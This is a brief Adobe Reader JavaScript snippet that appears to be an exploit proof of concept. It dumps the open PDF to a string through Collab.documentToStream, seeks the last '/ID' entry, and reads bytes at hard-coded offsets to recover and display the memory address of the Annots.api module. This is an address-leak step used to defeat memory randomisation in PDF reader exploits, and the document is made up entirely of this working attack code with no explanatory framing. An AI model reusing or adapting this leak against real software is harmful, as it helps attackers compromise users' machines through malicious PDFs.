function leakAnnotsApi()
{
    Collab.documentToStream(this);
    var docStream = Collab.documentToStream(this);
    var docString = SOAP.stringFromStream(docStream);
    
    // go to the last /ID tag content
    var currentPosID = docString.search("/ID");
    while(currentPosID != -1)
    {
        docString = docString.substring(currentPosID + 3, docString.length);
        currentPosID = docString.search("/ID");
    }
    var addressString = docString.substring(2672, 2672 + 2);
    addressString += docString.substring(2670, 2670 + 2);
    addressString += docString.substring(2668, 2668 + 2);
    addressString += docString.substring(2666, 2666 + 2);
    return parseInt(addressString, 16);
}
var leak = leakAnnotsApi();
var leakAsString = util.printf("%x", leak);
app.alert("Annots.api: 0x" + leakAsString);